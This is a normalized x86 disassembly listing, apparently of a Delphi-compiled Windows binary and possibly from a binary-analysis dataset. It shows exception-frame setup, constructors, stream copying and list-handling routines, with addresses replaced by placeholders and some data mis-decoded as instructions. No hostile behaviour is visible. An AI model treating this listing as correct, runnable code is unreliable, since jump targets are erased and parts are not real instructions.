push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026f4
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_41b414
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_402714
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_41b444
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
mov ah 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x180041b4 ] ch
add [ eax ] al
add al bl
adc [ eax ] al
mov al [ 0xffffffffac004034 ]
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ eax + 0xe0041b5 ] bh
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
adc al 0x0
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x32 ] ah
inc eax
add al cl
mov ch 0x41
add [ esi ] cl
push esp
push eax
jb r-xdata
imul edi [ eax + 0x75 ] r-xdata
add al 0xb5
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
mov ch 0x41
add [ eax ] bl
add [ eax ] al
add [ eax - 0x4c ] al
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_4040d8
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404548
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_40403c
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_40403c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41b518
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_40403c
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_40403c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_41b570
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_4040d8
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404548
mov al 0x1
inc ebx
sub_41b5c8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41b63f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4058a8
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_415274
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b646
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_4145bc
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_4058a8
mov ecx eax
mov eax esi
pop edx
call sub_40cfc4
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_4058a8
sub_41b64c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41b6f2
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b6f9
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_4040d8
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_420d74
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407ee0
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41b714
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4185ac
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4185ac
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4183f4
sub_41b74c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4185ac
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4185ac
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_418440
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4183f4
sub_41b794
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_41b92d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_418914
mov edi eax
xor edx edx
push ebp
push sub_41b90e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b915
mov eax [ rw-data ]
call sub_418978
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41b8ef
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41b89d
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_418550
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_417f10
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b8a4
mov eax [ ebp - 0x8 ]
call sub_403270
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_414844
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41b714
pop ecx
mov edx esi
mov eax edi
call sub_418440
mov eax ebx
call sub_403270
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41b64c
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_41b74c
pop ecx
inc esi
sub_41b8a4
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403270
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_418550
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
sub_41b93c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418914
mov edi eax
xor eax eax
push ebp
push sub_41b9d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418978
retn
mov edx ebx
mov eax edi
call sub_418550
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_418440
mov eax esi
call sub_403270
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407ee0
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41b9e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418914
mov edi eax
xor eax eax
push ebp
push sub_41ba5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418978
retn
mov edx ebx
mov eax edi
call sub_418550
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_418440
mov eax esi
call sub_403270
sub_41ba90
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_403a24
pop ecx
pop edx
pop ebx
retn
sub_41bad4
push ebx
push esi
push edi
call sub_403624
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b414
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_41bb10
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41d9e8
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41daf8
call sub_41ba84
sub_41bb34
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407ee0
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403fe8
sub_41bb68
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407ee0
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d9e8
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41bc29
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41bfac
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41bfac
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bc30
mov eax [ ebp - 0x8 ]
call sub_403270
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41daf8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41ba84
sub_41bc58
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_41bc78
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_404284
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4034dc
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41ba84
sub_41bce0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_418914
mov esi eax
xor edx edx
push ebp
push sub_41bd50
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bd57
mov eax [ rw-data ]
call sub_418978
retn
mov edx ebx
mov eax esi
call sub_418550
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403270
mov edx ebx
mov eax esi
call sub_418440
sub_41bd5c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41be6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41be72
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
xor edx edx
push ebp
push sub_41be4e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bea0
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41b570
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_418550
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_404080
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41b64c
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_418550
call sub_41bce0
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_418550
mov edx eax
mov eax [ rw-data ]
call sub_41888c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_41869c
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_41be7c
push ebx
mov ebx eax
mov eax ebx
call sub_41bf70
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41a988
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_41bea0
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403270
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_418550
call sub_403270
inc edi
dec esi
jne r-xdata
sub_41bedc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_4031b8
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_4179dc
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_4031fc
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_417a54
mov edi eax
mov edx [ esp + 0x4 ]
call sub_417954
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4031d4
test al al
jne r-xdata
sub_41bfac
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41bff8
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41bff8
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
sub_41c048
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41c093
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d848
mov eax [ ebp - 0x4 ]
call sub_4042a8
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c09a
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
call sub_41ba84
sub_41c0a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41c140
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41bc44
test al al
jne r-xdata
mov eax ebx
call sub_41bc44
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4191ec
jmp r-xdata
mov eax ebx
call sub_41bf88
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41cbb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c147
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_419120
mov esi eax
mov eax ebx
call sub_41cba8
jmp r-xdata
mov eax ebx
call sub_41caf8
mov eax ebx
call sub_41bc44
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41cd14
mov eax ebx
call sub_41cbb0
sub_41c170
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405034
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_4183f4
inc esi
dec ebx
jne r-xdata
sub_41c1ac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_420e90
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405034
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051f0
add esp 0x4
mov edx ebx
mov eax edi
call sub_420e64
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405034
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_420e64
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41c224
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405034
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41c28c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41c2ac
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_402784
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41c28c
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_41dcdc
call sub_402784
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403270
sub_41c30c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c3f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41de7c
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41c3c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41c3f7
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c2ac
pop ecx
test al al
jne r-xdata
call sub_403aa0
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a4c
sub_41c41c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c494
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_40346c
mov eax [ ebp + 0x8 ]
